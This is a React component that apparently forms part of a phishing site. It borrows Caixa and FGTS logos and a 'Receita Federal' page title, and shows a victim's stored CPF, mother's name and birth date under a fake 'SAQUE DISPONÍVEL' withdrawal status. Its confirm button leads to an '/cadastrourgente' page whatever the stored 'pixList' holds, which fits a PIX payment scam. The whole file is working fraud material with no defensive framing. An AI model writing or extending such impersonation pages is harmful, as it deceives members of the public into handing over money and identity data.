import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import flogo from "../assets/f-logo.png";
import { FaCheckCircle } from "react-icons/fa";
import { useNavigate } from "react-router-dom";
import { UserData } from "../types/userData";

export function VerificarDados() {
    const [loading, setLoading] = useState(false);
    const navigate = useNavigate();

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        nomeMae: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    useEffect(() => {
        document.title = "Verificação de Dados - Receita Federal";
    }, []);




    // Função para verificar o localStorage
    const handleConfirmar = async () => {
        setLoading(true);
        setTimeout(() => {
            const pixList = JSON.parse(localStorage.getItem("pixList") || "[]");
            setLoading(false);
            if (pixList.length > 0) {
                navigate("/cadastrourgente");
            } else {
                navigate("/cadastrourgente");
            }
        }, 1500); // Simulando uma pequena espera para o carregamento
    };

    return (
        <div className="w-full min-h-screen flex flex-col items-center bg-[#025bab] text-white px-4 pb-8">
            {/* Cabeçalho */}
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="flex items-center space-x-2 mb-6">
                <div className="bg-orange-400 p-2 rounded-full w-fit">
                    <img src={flogo} alt="flogo" width={20} />
                </div>
                <h2 className="font-bold text-2xl text-white">Verificação de Dados</h2>
            </div>

            {/* Informações de Verificação de Dados */}
            <div className="w-full max-w-md bg-white text-zinc-900 rounded-lg shadow-lg p-6 space-y-6">
                {[
                    { label: "Nome Completo", value: userData?.nome },
                    { label: "CPF", value: userData?.cpf },
                    { label: "Nome da mãe", value: userData?.nomeMae ? userData?.nomeMae : 'Não informado' },
                    { label: "Data de Nascimento", value: userData?.dataNascimento },
                ].map((field, index) => (
                    <div key={index} className="flex flex-col space-y-2">
                        <label className="text-zinc-700 font-semibold">{field.label}</label>
                        <p className="w-full p-3 border border-zinc-300 rounded-md bg-zinc-100 text-zinc-700">
                            {field.value}
                        </p>
                    </div>
                ))}

                {/* Status de Saque */}
                <div className="flex items-center space-x-2 bg-green-100 border border-green-400 p-4 rounded-md">
                    <FaCheckCircle className="text-green-500" size={40} />
                    <div className="flex flex-col">
                        <span className="text-sm font-semibold text-green-700">
                            Status do Saque
                        </span>
                        <span className="text-lg font-bold text-green-700">
                            SAQUE DISPONÍVEL
                        </span>
                    </div>
                </div>

                {/* Botão de Confirmação */}
                <button
                    onClick={handleConfirmar}
                    disabled={loading}
                    className={`${loading ? "bg-gray-500 cursor-wait" : "bg-orange-400 hover:bg-orange-500"
                        } w-full py-3 font-bold rounded-md text-white mt-4 transition duration-200 focus:outline-none focus:ring-2 focus:ring-orange-300 flex items-center justify-center`}
                >
                    {loading ? (
                        <svg
                            className="animate-spin h-5 w-5 text-white mr-2"
                            xmlns="http://www.w3.org/2000/svg"
                            fill="none"
                            viewBox="0 0 24 24"
                        >
                            <circle
                                className="opacity-25"
                                cx="12"
                                cy="12"
                                r="10"
                                stroke="currentColor"
                                strokeWidth="4"
                            ></circle>
                            <path
                                className="opacity-75"
                                fill="currentColor"
                                d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                            ></path>
                        </svg>
                    ) : null}
                    Confirmar Dados
                </button>
            </div>

            {/* Rodapé */}
            <div className="mt-8 text-center px-4">
                <h2 className="text-lg text-zinc-300 font-medium">Autenticação do Documento</h2>
                <p className="text-sm text-zinc-400">
                    A verificação pode ser realizada no portal oficial da Receita Federal.
                </p>
            </div>
        </div>
    );
}
